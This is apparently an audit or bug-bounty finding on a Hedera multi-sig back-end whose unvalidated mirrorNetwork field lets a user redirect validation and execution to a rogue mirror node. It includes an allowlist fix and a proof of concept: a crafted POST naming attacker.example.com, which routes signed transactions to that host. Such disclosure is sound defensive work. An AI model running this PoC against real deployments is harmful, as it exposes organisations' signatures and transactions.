### Title
Unvalidated `mirrorNetwork` Input Allows Node Validation Bypass and Transaction Execution Misdirection via Attacker-Controlled Mirror Node

### Summary
The `CreateTransactionDto.mirrorNetwork` field accepts any arbitrary string with no allowlist validation. When a non-standard value is supplied, the back-end constructs a Hedera SDK client pointing to an attacker-controlled mirror node, fetches the address book from that node, and uses the returned (attacker-controlled) node IDs as the "allowed" set for the `isTransactionValidForNodes` check. The same attacker-supplied `mirrorNetwork` is persisted to the database and later used by `ExecuteService._executeTransaction` to actually submit the transaction, routing multi-sig execution through attacker-controlled infrastructure.

### Finding Description

**Root cause — missing allowlist on `mirrorNetwork`:**

`CreateTransactionDto` validates `mirrorNetwork` only as `@IsNotEmpty()` and `@IsString()`, with no restriction to known-good values: [1](#0-0) 

**Step 1 — Attacker-controlled client construction:**

`createTransactions` immediately passes the raw user-supplied value to `getClientFromNetwork`: [2](#0-1) 

Inside `getClientFromNetwork`, any value that is not `mainnet`, `testnet`, `previewnet`, or `local-node` falls through to the `default` branch, which creates a client whose mirror network is set to the attacker-supplied URL and then fetches the address book from it: [3](#0-2) 

**Step 2 — Node validation bypass:**

The `isTransactionValidForNodes` check derives its "allowed" node set from the client that was just built against the attacker's mirror node: [4](#0-3) 

Because the attacker controls the address book response, they can make any node ID appear valid, bypassing the check entirely.

**Step 3 — Persisted and re-used at execution time:**

The attacker-supplied `mirrorNetwork` is stored verbatim in the `Transaction` entity: [5](#0-4) 

When the chain service later executes the transaction, `ExecuteService._executeTransaction` calls `getClientFromNetwork` again with the stored value, routing the actual on-chain submission through the attacker's infrastructure: [6](#0-5) 

### Impact Explanation

1. **Node validation bypass**: The `isTransactionValidForNodes` guard — the only server-side check ensuring a transaction targets legitimate Hedera network nodes — is rendered meaningless. An attacker can craft transactions targeting arbitrary node IDs and have them accepted by the server.

2. **Multi-sig integrity violation**: Other organization members sign the transaction believing it will be submitted to a known Hedera network (mainnet/testnet). Instead, when the chain service executes it, the transaction is submitted through the attacker's mirror node. The attacker's server can observe all transaction bytes, signatures, and private-key-derived metadata in transit, and can selectively drop or replay submissions.

3. **Confidentiality loss**: The address book query and transaction execution both pass through the attacker's server, exposing the full signed transaction payload (including all collected signatures) to the attacker.

### Likelihood Explanation

Any authenticated organization user can trigger this with a single crafted API call — no elevated privileges, no leaked credentials, and no physical access are required. The `mirrorNetwork` field is a normal part of the transaction creation workflow exposed via the standard REST endpoint. The attacker only needs a valid account and a publicly reachable server that speaks the Hedera mirror node gRPC protocol (or a minimal stub of it).

### Recommendation

Validate `mirrorNetwork` against a predefined allowlist of known-good values before using it to construct any client or persisting it. Add a custom class-validator decorator or an `IsIn` constraint to `CreateTransactionDto`:

```typescript
// back-end/apps/api/src/transactions/dto/create-transaction.dto.ts
import { IsIn, IsNotEmpty, IsString } from 'class-validator';

const ALLOWED_NETWORKS = ['mainnet', 'testnet', 'previewnet', 'local-node'];

export class CreateTransactionDto {
  // ...
  @IsNotEmpty()
  @IsString()
  @IsIn(ALLOWED_NETWORKS)
  mirrorNetwork: string;
  // ...
}
```

If custom mirror nodes must be supported, the allowed set should be configured server-side (e.g., via environment variable or admin-controlled configuration), never accepted verbatim from user input.

### Proof of Concept

1. Stand up a minimal gRPC server at `attacker.example.com:443` that responds to `AddressBookQuery` with a `NodeAddressBook` containing a single entry: node account ID `0.0.9999`.
2. As an authenticated organization user, POST to `/transactions`:
```json
{
  "name": "poc",
  "description": "poc",
  "transactionBytes": "<hex-encoded AccountCreateTransaction with nodeAccountIds=[0.0.9999]>",
  "creatorKeyId": <valid_key_id>,
  "signature": "<valid_signature>",
  "mirrorNetwork": "attacker.example.com"
}
```
3. Observe that the server accepts the transaction (the `isTransactionValidForNodes` check passes because `0.0.9999` is in the attacker-returned address book).
4. Have a second organization member sign the transaction.
5. Observe that when the chain service executes the transaction, it connects to `attacker.example.com:443` and submits the fully-signed transaction bytes there, exposing all signatures to the attacker.

### Citations

**File:** back-end/apps/api/src/transactions/dto/create-transaction.dto.ts (L26-28)
```typescript
  @IsNotEmpty()
  @IsString()
  mirrorNetwork: string;
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L405-405)
```typescript
    const client = await getClientFromNetwork(dtos[0].mirrorNetwork);
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L449-449)
```typescript
            mirrorNetwork: data.mirrorNetwork,
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L934-937)
```typescript
    const allowedNodes = getNodeAccountIdsFromClientNetwork(client);
    if (!isTransactionValidForNodes(sdkTransaction, allowedNodes)) {
      throw new BadRequestException(ErrorCodes.TNVN);
    }
```

**File:** back-end/libs/common/src/utils/sdk/client.ts (L38-46)
```typescript
  const client = Client.forNetwork({}).setMirrorNetwork(
    MirrorNetworkGRPC.fromBaseURL(mirrorNetwork[0]),
  );

  const nodeAddressBook = await new AddressBookQuery()
    .setFileId(FileId.ADDRESS_BOOK)
    .execute(client);

  client.setNetworkFromAddressBook(nodeAddressBook);
```

**File:** back-end/libs/common/src/execute/execute.service.ts (L132-132)
```typescript
    const client = await getClientFromNetwork(transaction.mirrorNetwork);
```
